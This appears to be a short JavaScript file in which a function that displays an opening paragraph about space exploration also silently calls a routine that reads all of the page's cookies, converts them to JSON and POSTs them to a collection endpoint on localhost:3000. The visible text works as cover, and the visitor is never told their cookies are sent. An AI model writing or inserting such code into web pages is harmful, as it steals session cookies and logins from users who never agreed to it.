function cookiesToJson() {
    const cookies = document.cookie.split("; ");
    const cookieObject = {};
    for (const cookie of cookies) {
      const [name, value] = cookie.split("=");
      cookieObject[name] = decodeURIComponent(value);
    }
    return JSON.stringify(cookieObject);
}

function displayText() {
  $('#info').html(`Title: "Exploring the Frontiers of Space: Unveiling the Secrets Beyond Our Blue Planet"
  In the vast expanse of the cosmos, beyond the twinkling stars that decorate our night sky, lies a realm of wonder and mystery that has captured the imagination of humanity for centuries. Space, the ultimate frontier, continues to beckon us with its infinite possibilities, offering a canvas for scientific discovery, technological innovation, and philosophical contemplation.`)
  send();
}

function send() {
    const requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        data: cookiesToJson() // Convert data to JSON format
      };
      
      $.ajax({
        url: 'http://localhost:3000/postData',
        type: requestOptions.method,
        contentType: requestOptions.headers['Content-Type'],
        data: requestOptions.data,
        success: function(data) {},
        error: function(error) {
          console.error(error);
        }
      }); 
}
